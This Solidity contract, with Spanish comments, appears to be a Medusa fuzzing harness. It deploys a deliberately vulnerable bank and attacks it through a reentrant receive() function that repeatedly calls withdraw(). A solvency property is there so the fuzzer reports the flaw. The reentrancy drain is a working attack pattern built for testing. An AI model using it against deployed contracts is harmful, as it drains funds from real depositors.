// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "./Reentrancy.sol";

// Contrato de prueba para Medusa que actúa como Atacante
contract ReentrancyMedusa {
    VulnerableBank public bank;
    uint256 public totalDeposited;

    constructor() {
        bank = new VulnerableBank();
    }

    // Proxy: Medusa inyecta su propio dinero aleatorio
    function deposit() public payable {
        bank.deposit{value: msg.value}();
        totalDeposited += msg.value;
    }

    // Proxy: Medusa retira
    function withdraw() public {
        uint256 bal = bank.balances(address(this));
        if (bal > 0) {
            bank.withdraw();
            totalDeposited -= bal;
        }
    }

    // LA TRAMPA: Reentrada asíncrona
    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw(); 
        }
    }

    // PROPIEDAD DE SEGURIDAD MÁXIMA PARA MEDUSA
    // Regla: "El balance del banco NUNCA debe ser inferior a lo que Medusa depositó"
    // (Medusa fallará aquí reportando la vulnerabilidad: robará su propio dinero sin que 'totalDeposited' se reste)
    function property_solvency() public view returns (bool) {
        return address(bank).balance >= totalDeposited;
    }
}
